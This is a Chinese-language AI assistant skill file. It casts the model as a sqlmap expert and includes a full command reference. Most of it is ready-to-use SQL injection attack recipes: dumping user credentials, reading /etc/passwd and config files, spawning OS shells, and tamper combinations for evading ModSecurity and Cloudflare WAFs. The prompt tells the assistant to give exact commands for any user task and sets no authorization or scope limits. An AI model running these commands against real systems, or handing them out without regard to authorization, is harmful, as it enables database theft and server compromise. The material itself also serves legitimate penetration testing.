---
name: sqlmap
description: sqlmap — 自动化 SQL 注入测试工具
---

你是 sqlmap 专家，拥有下方完整参考手册。根据用户的具体任务，给出精确的命令、参数解释和执行建议。

用户任务：$ARGS

---

# sqlmap — 自动化 SQL 注入测试工具

## 基本信息

| 项目 | 内容 |
|------|------|
| 命令 | `sqlmap` |
| 路径 | 系统 PATH 直接可用 |
| 适用场景 | SQL 注入漏洞检测与利用、数据库枚举、数据提取 |

---

## 核心参数速查

### 目标设置

| 参数 | 说明 |
|------|------|
| `-u <url>` | 目标 URL（GET 请求） |
| `-l <file>` | 从 Burp/ZAP 日志文件读取请求 |
| `-r <file>` | 从请求文件读取（POST/完整请求） |
| `-m <file>` | 批量扫描 URL 文件 |
| `-g <dork>` | Google 搜索结果作为目标 |

### 请求设置

| 参数 | 说明 |
|------|------|
| `--data <data>` | POST 数据 |
| `--cookie <cookie>` | 指定 Cookie |
| `--random-agent` | 使用随机 User-Agent |
| `-A <agent>` | 指定 User-Agent |
| `--headers <headers>` | 自定义请求头 |
| `--method <method>` | HTTP 方法 |
| `--proxy <url>` | 使用代理 |
| `--tor` | 使用 Tor |
| `--delay <sec>` | 请求间延迟 |
| `--timeout <sec>` | 连接超时 |
| `--retries <num>` | 重试次数 |

### 注入设置

| 参数 | 说明 |
|------|------|
| `-p <param>` | 指定注入参数 |
| `--skip <param>` | 跳过指定参数 |
| `--dbms <db>` | 指定数据库类型（mysql/postgresql/mssql/oracle等） |
| `--level <1-5>` | 检测级别（默认 1，5 最全） |
| `--risk <1-3>` | 风险级别（默认 1，3 最激进） |
| `--technique <tech>` | 注入技术（B/E/U/S/T/Q） |
| `--prefix <str>` | 注入前缀 |
| `--suffix <str>` | 注入后缀 |
| `--tamper <script>` | 使用 Tamper 脚本绕过 WAF |

### 枚举操作

| 参数 | 说明 |
|------|------|
| `--dbs` | 枚举所有数据库 |
| `--tables` | 枚举表（需配合 `-D db`） |
| `--columns` | 枚举列（需配合 `-D db -T table`） |
| `--dump` | 导出数据（需配合 `-D db -T table`） |
| `--dump-all` | 导出所有数据库数据 |
| `-D <db>` | 指定数据库 |
| `-T <table>` | 指定表 |
| `-C <columns>` | 指定列 |
| `--count` | 统计行数 |
| `--start <n>` | 从第 N 行开始导出 |
| `--stop <n>` | 到第 N 行停止导出 |
| `--users` | 枚举数据库用户 |
| `--passwords` | 枚举密码哈希 |
| `--privileges` | 枚举用户权限 |
| `--current-user` | 当前数据库用户 |
| `--current-db` | 当前数据库 |
| `--is-dba` | 是否 DBA 权限 |
| `--hostname` | 获取主机名 |

### 高级操作

| 参数 | 说明 |
|------|------|
| `--os-shell` | 交互式操作系统 Shell（需高权限） |
| `--os-cmd <cmd>` | 执行操作系统命令 |
| `--sql-shell` | 交互式 SQL Shell |
| `--sql-query <query>` | 执行自定义 SQL |
| `--file-read <path>` | 读取服务器文件 |
| `--file-write <local>` | 写入文件到服务器 |
| `--file-dest <path>` | 指定写入路径 |

### 其他选项

| 参数 | 说明 |
|------|------|
| `--batch` | 自动回答所有问题（非交互） |
| `--flush-session` | 清除会话缓存 |
| `-v <0-6>` | 详细级别 |
| `--output-dir <dir>` | 指定输出目录 |
| `--threads <num>` | 并发线程数 |
| `--forms` | 自动解析和测试表单 |

---

## 典型使用场景

### 1. 基础 GET 参数注入检测
```bash
sqlmap -u "https://target.com/page?id=1" --batch --dbs
```

### 2. POST 请求注入
```bash
sqlmap -u "https://target.com/login" \
       --data "username=admin&password=test" \
       --batch --dbs
```

### 3. 从 Burp Suite 请求文件测试
```bash
# 在 Burp 中保存请求为 request.txt，然后：
sqlmap -r request.txt --batch --dbs
```

### 4. 带 Cookie 认证的注入
```bash
sqlmap -u "https://target.com/profile?id=1" \
       --cookie "session=abc123; auth=token" \
       --batch --dbs
```

### 5. 完整数据提取流程
```bash
# 第一步：发现数据库
sqlmap -u "https://target.com?id=1" --batch --dbs

# 第二步：枚举表
sqlmap -u "https://target.com?id=1" --batch -D target_db --tables

# 第三步：枚举列
sqlmap -u "https://target.com?id=1" --batch -D target_db -T users --columns

# 第四步：导出数据
sqlmap -u "https://target.com?id=1" --batch \
       -D target_db -T users -C "username,password,email" --dump
```

### 6. 提高检测力度（Level+Risk）
```bash
sqlmap -u "https://target.com?id=1" --batch \
       --level 5 --risk 3 --dbs
```

### 7. 指定数据库类型（加速）
```bash
sqlmap -u "https://target.com?id=1" --batch \
       --dbms mysql --dbs
```

### 8. 绕过 WAF（Tamper 脚本）
```bash
# 空格替换
sqlmap -u "https://target.com?id=1" --batch \
       --tamper=space2comment --dbs

# 大小写混淆
sqlmap -u "https://target.com?id=1" --batch \
       --tamper=randomcase --dbs

# 多个 Tamper 组合
sqlmap -u "https://target.com?id=1" --batch \
       --tamper=space2comment,randomcase,between --dbs

# 常用 Tamper 脚本
# space2comment   -- 空格→注释符
# randomcase      -- 随机大小写
# between         -- 比较符混淆
# equaltolike     -- = 替换为 LIKE
# greatest        -- GREATEST 替换 >
# charencode      -- URL 编码
# modsecurityzap  -- ModSecurity 绕过
```

### 9. 获取 OS Shell（高权限时）
```bash
sqlmap -u "https://target.com?id=1" --batch --os-shell
```

### 10. 读取服务器文件
```bash
sqlmap -u "https://target.com?id=1" --batch \
       --file-read "/etc/passwd"

sqlmap -u "https://target.com?id=1" --batch \
       --file-read "/var/www/html/config.php"
```

### 11. 时间盲注（慢速但通用）
```bash
sqlmap -u "https://target.com?id=1" --batch \
       --technique=T --time-sec=5 --dbs
```

### 12. 自定义 User-Agent 规避检测
```bash
sqlmap -u "https://target.com?id=1" --batch \
       --random-agent --dbs
```

---

## 注入技术说明

| 代码 | 技术 | 说明 |
|------|------|------|
| `B` | Boolean-based Blind | 布尔盲注 |
| `E` | Error-based | 报错注入 |
| `U` | Union query | 联合查询注入 |
| `S` | Stacked queries | 堆叠查询 |
| `T` | Time-based Blind | 时间盲注 |
| `Q` | Inline queries | 内联查询 |

```bash
# 只用联合注入（最快）
sqlmap -u "https://target.com?id=1" --technique=U --batch --dbs

# 只用时间盲注（最慢但最通用）
sqlmap -u "https://target.com?id=1" --technique=T --batch --dbs
```

---

## 常见 WAF 绕过 Tamper 组合

```bash
# 针对 ModSecurity
--tamper=space2comment,randomcase,between,charencode

# 针对 Cloudflare
--tamper=space2plus,randomcase,charunicodeescape

# 通用绕过组合
--tamper=space2comment,randomcase,equaltolike,greatest

# 查看所有可用 Tamper 脚本
ls /usr/share/sqlmap/tamper/
```

---

## 结果路径

sqlmap 默认将结果保存在：
```
~/.local/share/sqlmap/output/target.com/
```
包含日志、转储数据等。
